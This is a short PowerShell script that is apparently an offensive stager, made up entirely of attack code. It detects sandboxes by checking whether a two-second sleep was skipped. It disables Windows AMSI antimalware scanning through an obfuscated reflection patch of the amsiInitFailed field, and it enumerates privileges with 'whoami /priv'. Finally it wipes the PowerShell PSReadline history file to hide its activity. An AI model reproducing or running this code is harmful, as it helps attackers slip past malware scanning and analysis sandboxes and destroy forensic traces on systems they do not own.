# Sleep detection
$start=get-date;
Start-Sleep -Seconds 2;
$end=get-date;(&{If(($end - $start).TotalSeconds -lt 2) { exit }});

# Break AMSI
$i="i";$a="a";$u="u";$p=@("*${i}${u}t${i}ls", "NonP${u}bl${i}c,St${a}t${i}c", "*F${a}${i}led");
$a_c=[Ref].Assembly.GetTypes;
Foreach($b in $a_c.invoke()) {if ($b.Name -like $p[0]) {
    $b_c=$b.GetFields;
    Foreach($d in $b_c.invoke($p[1])) {if ($d.Name -like $p[2]) {
        $d_c=$d.SetValue;
        $d_c.invoke($null,$true);
    }};
}};

# Enumeration placeholder
whoami /priv

# Clean-up time
Clear-Content "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt"
